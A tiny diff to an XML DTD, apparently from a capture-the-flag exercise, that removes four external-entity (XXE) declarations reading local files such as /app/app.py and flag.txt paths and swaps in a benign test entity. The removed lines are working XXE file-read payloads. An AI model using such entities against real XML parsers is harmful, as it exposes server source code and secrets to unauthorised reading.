@@ -1,4 +1,1 @@
-<!ENTITY t SYSTEM "file:///app/app.py">
-<!ENTITY p1 SYSTEM "file:///app/flag.txt">
-<!ENTITY p2 SYSTEM "file:///flag.txt">
-<!ENTITY p3 SYSTEM "file:///app/flag">
+<!ENTITY xxe "DTD_OK_123">
